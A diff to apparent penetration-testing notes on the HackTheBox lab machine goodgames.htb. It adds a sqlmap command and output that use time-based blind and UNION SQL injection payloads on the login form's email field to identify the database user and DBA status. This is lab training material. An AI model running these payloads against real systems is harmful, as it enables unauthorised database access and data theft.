@@ -7,6 +7,10 @@ _Current IP:_ 10.10.11.130
 
 _Host Name:_ goodgames.htb  (added to /etc/hosts)
 
+_current DB user_: 'main_admin@localhost'
+
+_current user is DBA_: False
+
 ## To-Do
 ### Input Validation
 [ ] Check for input validation at [signup](http://goodgames.htb/signup)
@@ -535,4 +539,48 @@ back-end DBMS: MySQL >= 5.0.12
 [12:35:25] [INFO] fetched data logged to text files under '/home/ops/.local/share/sqlmap/output/goodgames.htb'
 
 [*] ending @ 12:35:25 /2022-12-22/
+```
+
+Checking who we are running as and if we are a DBA
+```
+[ 12:36PM ]  [ ops@redteam:~/Documents/PT/HTB-goodgames/data ]
+ $ sqlmap -u "http://goodgames.htb/login" --data "email=*&password=*" --current-user --is-dba   
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.12#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:45:19 /2022-12-22/
+
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[12:45:21] [INFO] resuming back-end DBMS 'mysql' 
+[12:45:21] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=' AND (SELECT 1612 FROM (SELECT(SLEEP(5)))OMJn) AND 'asXf'='asXf&password=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: email=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71716b7871,0x6556565a707445516e4f50797659665a524c546b464a4b48756462794871444b7955445079645357,0x7178716a71)-- -&password=
+---
+[12:45:22] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[12:45:22] [INFO] fetching current user
+got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
+current user: 'main_admin@localhost'
+[12:45:27] [INFO] testing if current user is DBA
+[12:45:27] [INFO] fetching current user
+[12:45:27] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+current user is DBA: False
+[12:45:27] [INFO] fetched data logged to text files under '/home/ops/.local/share/sqlmap/output/goodgames.htb'
+
+[*] ending @ 12:45:27 /2022-12-22/
+
 ```
